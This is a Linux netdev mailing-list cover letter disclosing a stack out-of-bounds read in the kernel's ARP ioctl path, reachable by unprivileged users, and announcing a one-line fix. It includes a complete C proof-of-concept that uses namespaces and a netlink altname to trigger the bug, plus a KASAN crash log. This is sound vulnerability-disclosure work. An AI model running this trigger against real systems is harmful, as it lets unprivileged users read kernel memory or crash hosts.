Received: from mail-pj2-f13.google.com (mail-pj2-f13.google.com [74.125.227.141])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id BFA194718C7
	for <netdev@vger.kernel.org>; Sun, 20 Sep 2026 17:36:51 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.141
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789925814; cv=none; b=gPrK+wKFSsc4SkhP1Yl+5w+kHLstmDNoSk1/AWAfdIZHGsvaGIjqlFsPKN0YioHhaV28Cx6sk3kVoR/daQBeJDq7dfBPM5dy1Fw7HzXgkLgNc4Wr3J7L6Y+AUBbzTKHdoQ7Gn8742qKrJmT3GjMIDMpRapVk5qtDipzJ3REfIgo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789925814; c=relaxed/simple;
	bh=rJmxtRtpadjBscEd5dfwGsYgeqflTPRoGSozeuTHSjY=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=ZB13+whI6HfPoNKk5vPK+/gFJKO8tNT360MdwvzGe+PvEvYK4LeHJiBVcYhvP9lV+4WW91hV7mxl2Nfqf0YBEoCa2sHy4nuXE95Uxpr63JeQWltAIX6A7yj6vbxEcihxmU/OFriMn/kxcFQY1C76Bg/4aqphDuOBYoIS6tQhfS8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=T3HqEApb; arc=none smtp.client-ip=74.125.227.141
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="T3HqEApb"
Received: by mail-pj2-f13.google.com with SMTP id d9443c01a7336-2d747f0135fso21717845ad.0
        for <netdev@vger.kernel.org>; Sun, 20 Sep 2026 10:36:51 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789925810; x=1790530610; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=qzk5frmhms4EJbngq7jlg6yf5b4XyG1383sLsS518os=;
        b=T3HqEApbyfJknXSJqGNeTQGubK4/W1G57CX6qzjXQnb7TutC3bCd+hEM3c/8qAUKjG
         spexXoo8ewzMCKnJlHzSXZ++gT0Z15RoSfVZeQiyjuR/ieli3Q3HbzZEg+acM5ijGUqJ
         lh3OpF1bXd9ynhurSx0bDeCpG9CZYmk784bLQdntlUrJVtU1E/pMlkPb9kKNfe9WVny4
         qHCdTw6l5kvrKEuao4CZROjwVp0GSifDb3gN4YnjobxhOBqzmzoID2ocsLZXKdb3+Rxk
         tbE4Gic3MHIc7wmNQfDmD+la1qdDSupVe44cObTIjFgHxnNkU/A6MTKLkJGDmhjgmun1
         3t6g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789925810; x=1790530610;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=qzk5frmhms4EJbngq7jlg6yf5b4XyG1383sLsS518os=;
        b=fSF6m9dYSFDMDEmpa+xPRvgkcIhDLOSOK1Fg8c9ORHUM0mx2w23fTtvwSYcWWJ2WlM
         j5DT5PaS4AigiCHTGAVnt2Q5WxuiWyA2TYPHaFTsD/Yj59+HTG0aut7DpCfU+3u8ih1U
         47Ru/n531P72A/9VWNsiis7ezVTZKf31YANDZDtQCxihjdxPa/scPiyuJjIByJ0CLKIb
         Wv6W/LYofxkn+TiEIEy1E8x5Ajln+pMXx8n6Uxl1JG7SHtI1Z0N+6t9wEUn2foavvgyd
         v9kXu4XdzalchKbBV751GCEazj7Bc6LInSUGpO5RJernBn1BDgUoGf1M9hC00r1P1du8
         JLlQ==
X-Gm-Message-State: AFuF++mgk3CxiVRcud4D1fhyXbr5hgjeA3u3jRJ2dh7KAf9X4c7urXz/
	/in8CnLvHoQg9pOIgLMiocRf8MXCJ7rdI+MqNc8nWl7Rgoq02ueg1iruUC77KNrWcZjsn04HrOM
	c1bl0YQ==
X-Gm-Gg: AYBFou2tSN96c2BTwd/T2y8Tbkil2cbhNZvW4nxJ4cCXVSzVK4WbZbi9S/y+PjYVf2S
	uajHGzGC9VOX7b8eR0N6q5uPtFNVyw5cUe3Cw68DrR7KHwNJytpK2BqYr3UVAJLtSEXqLz6g69R
	+3MuS3T62kBtdmjbvUobG4cpXjm7nGko4uKzwoG1xt4RjiFPYSPDdxpd1IbzHIA3drcSSuZVHKv
	qzyNUt2LysF8Kvp4zsFgm3CPJKojV7WXOu+NJYKsXjBlEHPf1ZyzpHjfMp1R10WLCTqbpMrU8Qh
	rVfbIHp2EDq+InOnLF+aPWJKngeLvyjsZ4m9bGcfxWdUluHSrQzQRxzTfB+v/mMpJyIuwjsT++X
	Xf6UXUpytGCK0dG2lHIzBoa3yPd5F0K2ZzqYTfTpMcIEO6LLycrqXneLHgCEjiabNuo9C+P/zpU
	Ec0Vf0EcEPaEG1oUVEmyIMzuoaZso53cdz1vMAjfI5xC66opt+RzJ6fCGsBEYK8yXDfCSZyQN1e
	tKjhFcbxheev35Qp2Q=
X-Received: by 2002:a17:90b:52cf:b0:39d:ec43:df74 with SMTP id 98e67ed59e1d1-39e54bdc9a2mr14583388a91.12.1789925810116;
        Sun, 20 Sep 2026 10:36:50 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e6cb3284asm10081850a91.14.2026.09.20.10.36.43
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 20 Sep 2026 10:36:49 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org,
	idosch@nvidia.com
Cc: dsahern@kernel.org,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	jiri@resnulli.us,
	vega@nebusec.ai,
	milkory@outlook.com,
	weir@nebusec.ai
Subject: [PATCH net v2 0/1] net: arp: fix stack out-of-bounds read via unterminated device name
Date: Mon, 21 Sep 2026 01:36:18 +0800
Message-ID: <cover.1789910973.git.milkory@outlook.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zijie Huang <milkory@outlook.com>

Hi Linux kernel maintainers,

We found an issue in net/ipv4/arp.c. The bug is reachable by an
unprivileged user using private user and network namespaces. The relevant
details are provided below.

---- details below ----

Bug details:

arp_ioctl() copies user-provided struct arpreq into kernel stack, while not
ensuring arpreq.arp_dev to be NUL-terminated. arp_req_get() then passes
this string to dev_get_by_name_rcu() / __dev_get_by_name(), which will
eventually reach strcmp() and trigger an out-of-bound read.

This series terminates device name before lookup.

Reproducer:

	gcc -x c -O2 -Wall -Wextra -o poc poc.c
	chmod +x ./poc && ./poc


We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_link.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static int write_file(const char *path, const char *value)
{
	int fd = open(path, O_WRONLY);
	size_t length = strlen(value);
	ssize_t written;

	if (fd < 0)
		return -1;
	written = write(fd, value, length);
	close(fd);
	if (written != (ssize_t)length) {
		errno = EIO;
		return -1;
	}
	return 0;
}

static int enter_namespaces(void)
{
	char map[64];
	uid_t uid = getuid();
	gid_t gid = getgid();

	if (unshare(CLONE_NEWUSER) < 0)
		return -1;
	if (write_file("/proc/self/setgroups", "deny") < 0 && errno != ENOENT)
		return -1;
	snprintf(map, sizeof(map), "0 %u 1\n", (unsigned int)uid);
	if (write_file("/proc/self/uid_map", map) < 0)
		return -1;
	snprintf(map, sizeof(map), "0 %u 1\n", (unsigned int)gid);
	if (write_file("/proc/self/gid_map", map) < 0)
		return -1;
	if (setresgid(0, 0, 0) < 0 || setresuid(0, 0, 0) < 0)
		return -1;
	return unshare(CLONE_NEWNET);
}

static int addattr(struct nlmsghdr *nlh, size_t maxlen, int type,
		   const void *data, size_t length)
{
	struct rtattr *attr;
	size_t offset = NLMSG_ALIGN(nlh->nlmsg_len);
	size_t size = RTA_LENGTH(length);

	if (offset + RTA_ALIGN(size) > maxlen) {
		errno = EMSGSIZE;
		return -1;
	}
	attr = (struct rtattr *)((char *)nlh + offset);
	attr->rta_type = type;
	attr->rta_len = size;
	memcpy(RTA_DATA(attr), data, length);
	nlh->nlmsg_len = offset + RTA_ALIGN(size);
	return 0;
}

static struct rtattr *addnest(struct nlmsghdr *nlh, size_t maxlen, int type)
{
	struct rtattr *nest;
	size_t offset = NLMSG_ALIGN(nlh->nlmsg_len);
	size_t size = RTA_LENGTH(0);

	if (offset + RTA_ALIGN(size) > maxlen) {
		errno = EMSGSIZE;
		return NULL;
	}
	nest = (struct rtattr *)((char *)nlh + offset);
	nest->rta_type = type | NLA_F_NESTED;
	nest->rta_len = size;
	nlh->nlmsg_len = offset + RTA_ALIGN(size);
	return nest;
}

static void endnest(struct nlmsghdr *nlh, struct rtattr *nest)
{
	nest->rta_len = (char *)nlh + nlh->nlmsg_len - (char *)nest;
}

static int add_altname(void)
{
	static const char altname[] = "abcdefghijklmnopQ";
	struct sockaddr_nl peer = { .nl_family = AF_NETLINK };
	struct rtattr *properties;
	struct {
		struct nlmsghdr nlh;
		struct ifinfomsg ifm;
		char attributes[512];
	} request = { 0 };
	char response[4096];
	int fd;
	ssize_t length;

	request.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(request.ifm));
	request.nlh.nlmsg_type = RTM_NEWLINKPROP;
	request.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	request.nlh.nlmsg_seq = 1;
	request.ifm.ifi_family = AF_UNSPEC;
	request.ifm.ifi_index = (int)if_nametoindex("lo");
	if (!request.ifm.ifi_index) {
		errno = ENODEV;
		return -1;
	}
	properties = addnest(&request.nlh, sizeof(request), IFLA_PROP_LIST);
	if (!properties || addattr(&request.nlh, sizeof(request), IFLA_ALT_IFNAME,
				   altname, sizeof(altname)) < 0)
		return -1;
	endnest(&request.nlh, properties);

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0)
		return -1;
	if (sendto(fd, &request, request.nlh.nlmsg_len, 0,
		   (struct sockaddr *)&peer, sizeof(peer)) < 0) {
		close(fd);
		return -1;
	}
	length = recv(fd, response, sizeof(response), 0);
	close(fd);
	if (length < 0)
		return -1;
	for (struct nlmsghdr *message = (struct nlmsghdr *)response;
	     NLMSG_OK(message, length);
	     message = NLMSG_NEXT(message, length)) {
		if (message->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *error = NLMSG_DATA(message);

			if (error->error) {
				errno = -error->error;
				return -1;
			}
			return 0;
		}
	}
	errno = EPROTO;
	return -1;
}

int main(void)
{
	static const char token[IFNAMSIZ] = "abcdefghijklmnop";
	struct arpreq request = { 0 };
	struct sockaddr_in *protocol_address = (struct sockaddr_in *)&request.arp_pa;
	int fd;
	int result;

	if (enter_namespaces() < 0 || add_altname() < 0) {
		perror("setup");
		return 1;
	}
	protocol_address->sin_family = AF_INET;
	protocol_address->sin_addr.s_addr = inet_addr("10.0.2.1");
	memcpy(request.arp_dev, token, sizeof(token));
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return 1;
	}
	result = ioctl(fd, SIOCGARP, &request);
	printf("ioctl(SIOCGARP) returned %d errno=%d (%s)\n",
	       result, errno, strerror(errno));
	close(fd);
	return 0;
}


------END PoC--------

----BEGIN crash log----

[  174.726710][ T9362] ==================================================================
[  174.726733][ T9362] BUG: KASAN: stack-out-of-bounds in strcmp+0x9c/0xb0
[  174.726834][ T9362] Read of size 1 at addr ffffc9000ea0faac by task poc/9362
[  174.726839][ T9362]
[  174.726843][ T9362] CPU: 1 UID: 1001 PID: 9362 Comm: poc Not tainted 7.3.0-rc2-00478-gc9151088f167 #1 PREEMPT(full)
[  174.726851][ T9362] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  174.726854][ T9362] Call Trace:
[  174.726856][ T9362]  <TASK>
[  174.726859][ T9362]  dump_stack_lvl+0x100/0x190
[  174.726887][ T9362]  print_report+0x13d/0x4b0
[  174.726896][ T9362]  ? __lock_acquire+0x5c0/0x1f40
[  174.726927][ T9362]  ? _raw_spin_lock_irqsave+0x52/0x60
[  174.726934][ T9362]  ? strcmp+0x9c/0xb0
[  174.726939][ T9362]  kasan_report+0xdf/0x1c0
[  174.726953][ T9362]  ? strcmp+0x9c/0xb0
[  174.726960][ T9362]  strcmp+0x9c/0xb0
[  174.726967][ T9362]  dev_get_by_name_rcu+0xff/0x1a0
[  174.727007][ T9362]  arp_req_dev_by_name+0x36/0x1e0
[  174.727021][ T9362]  arp_ioctl+0x583/0xcb0
[  174.727027][ T9362]  ? __pfx_arp_ioctl+0x10/0x10
[  174.727032][ T9362]  ? avc_has_extended_perms+0x201/0x1080
[  174.727059][ T9362]  ? avc_has_extended_perms+0x484/0x1080
[  174.727065][ T9362]  inet_ioctl+0x1a4/0x3f0
[  174.727072][ T9362]  ? __pfx_inet_ioctl+0x10/0x10
[  174.727082][ T9362]  ? tomoyo_path_number_perm+0x188/0x580
[  174.727091][ T9362]  sock_do_ioctl+0x118/0x280
[  174.727097][ T9362]  ? __pfx_sock_do_ioctl+0x10/0x10
[  174.727102][ T9362]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  174.727116][ T9362]  ? __pfx_do_vfs_ioctl+0x10/0x10
[  174.727122][ T9362]  ? ioctl_has_perm.constprop.0.isra.0+0x380/0x540
[  174.727131][ T9362]  ? __pfx_ioctl_has_perm.constprop.0.isra.0+0x10/0x10
[  174.727138][ T9362]  sock_ioctl+0x599/0x6b0
[  174.727144][ T9362]  ? __pfx_sock_ioctl+0x10/0x10
[  174.727151][ T9362]  ? selinux_file_ioctl+0x13b/0x290
[  174.727157][ T9362]  ? selinux_file_ioctl+0xb6/0x290
[  174.727164][ T9362]  ? __pfx_sock_ioctl+0x10/0x10
[  174.727170][ T9362]  __x64_sys_ioctl+0x18e/0x210
[  174.727176][ T9362]  do_syscall_64+0x119/0x770
[  174.727183][ T9362]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  174.727188][ T9362] RIP: 0033:0x7fecf1fb72d7
[  174.727194][ T9362] Code: 00 00 00 48 8b 05 b9 cb 0d 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 89 cb 0d 00 f7 d8 64 89 01 48
[  174.727200][ T9362] RSP: 002b:00007ffc66e96158 EFLAGS: 00000202 ORIG_RAX: 0000000000000010
[  174.727207][ T9362] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007fecf1fb72d7
[  174.727211][ T9362] RDX: 00007ffc66e961a0 RSI: 0000000000008954 RDI: 0000000000000003
[  174.727215][ T9362] RBP: 0000000000000003 R08: 0000000000000001 R09: 0000000000000000
[  174.727218][ T9362] R10: fffffffffffff689 R11: 0000000000000202 R12: 00000000000003e9
[  174.727222][ T9362] R13: 00000000000003e9 R14: 0000000000000000 R15: 0000000000000000
[  174.727227][ T9362]  </TASK>
[  174.727229][ T9362]
[  174.727231][ T9362] The buggy address belongs to stack of task poc/9362
[  174.727234][ T9362]  and is located at offset 148 in frame:
[  174.727236][ T9362]  arp_ioctl+0x0/0xcb0
[  174.727241][ T9362]
[  174.727243][ T9362] This frame has 3 objects:
[  174.727245][ T9362]  [48, 52) 'ip'
[  174.727249][ T9362]  [64, 68) 'ip'
[  174.727252][ T9362]  [80, 148) 'r'
[  174.727255][ T9362]
[  174.727256][ T9362] The buggy address belongs to a vmalloc virtual mapping
[  174.727262][ T9362] The buggy address belongs to the physical page:
[  174.727265][ T9362] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x382df
[  174.727270][ T9362] memcg:ffff88804c72a242
[  174.727272][ T9362] flags: 0xfff00000000000(node=0|zone=1|lastcpupid=0x7ff)
[  174.727280][ T9362] raw: 00fff00000000000 0000000000000000 ffffea0000e0b7c8 0000000000000000
[  174.727285][ T9362] raw: 0000000000000000 0000000000000000 00000001ffffffff ffff88804c72a242
[  174.727287][ T9362] page dumped because: kasan: bad access detected
[  174.727290][ T9362] page_owner tracks the page as allocated
[  174.727292][ T9362] page last allocated via order 0, migratetype Unmovable, gfp_mask 0x29c2(GFP_NOWAIT|__GFP_HIGHMEM|__GFP_IO|__GFP_FS|__GFP_ZERO), pid 9327, tgid 9327 (run-parts), ts 125566247652
[  174.727301][ T9362]  post_alloc_hook+0xfd/0x120
[  174.727309][ T9362]  get_page_from_freelist+0x110d/0x35d0
[  174.727317][ T9362]  __alloc_frozen_pages_noprof+0x2eb/0x3300
[  174.727323][ T9362]  alloc_pages_mpol+0x201/0x550
[  174.727329][ T9362]  alloc_pages_noprof+0x1a/0x160
[  174.727335][ T9362]  __vmalloc_node_range_noprof+0x833/0x1420
[  174.727341][ T9362]  __vmalloc_node_noprof+0xad/0xf0
[  174.727348][ T9362]  copy_process+0x803/0x8370
[  174.727360][ T9362]  kernel_clone+0x176/0x9d0
[  174.727365][ T9362]  __do_sys_clone+0xd9/0x120
[  174.727370][ T9362]  do_syscall_64+0x119/0x770
[  174.727376][ T9362]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  174.727381][ T9362] page last free pid 9324 tgid 9324 ts 125529716235 stack trace:
[  174.727385][ T9362]  __free_frozen_pages+0x79f/0x10f0
[  174.727391][ T9362]  qlist_free_all+0x47/0xf0
[  174.727396][ T9362]  kasan_quarantine_reduce+0x1a0/0x1f0
[  174.727401][ T9362]  __kasan_slab_alloc+0x69/0x90
[  174.727407][ T9362]  kmem_cache_alloc_noprof+0x269/0x6a0
[  174.727412][ T9362]  do_getname+0x35/0x390
[  174.727419][ T9362]  do_sys_openat2+0xc7/0x1e0
[  174.727425][ T9362]  __x64_sys_openat+0x12d/0x210
[  174.727430][ T9362]  do_syscall_64+0x119/0x770
[  174.727437][ T9362]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  174.727442][ T9362]
[  174.727444][ T9362] Memory state around the buggy address:
[  174.727446][ T9362]  ffffc9000ea0f980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  174.727449][ T9362]  ffffc9000ea0fa00: 00 00 00 f1 f1 f1 f1 f1 f1 04 f2 04 f2 00 00 00
[  174.727453][ T9362] >ffffc9000ea0fa80: 00 00 00 00 00 04 f3 f3 f3 f3 f3 00 00 00 00 00
[  174.727455][ T9362]                                   ^
[  174.727458][ T9362]  ffffc9000ea0fb00: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 f1 f1 00 00
[  174.727461][ T9362]  ffffc9000ea0fb80: 00 00 00 f2 f2 f2 f2 f2 00 00 00 00 00 00 00 00
[  174.727464][ T9362] ==================================================================


-----END crash log-----

Best regards,
Zijie Huang


Zijie Huang (1):
  net: arp: terminate device name before lookup

 net/ipv4/arp.c | 1 +
 1 file changed, 1 insertion(+)

-- 
2.47.3

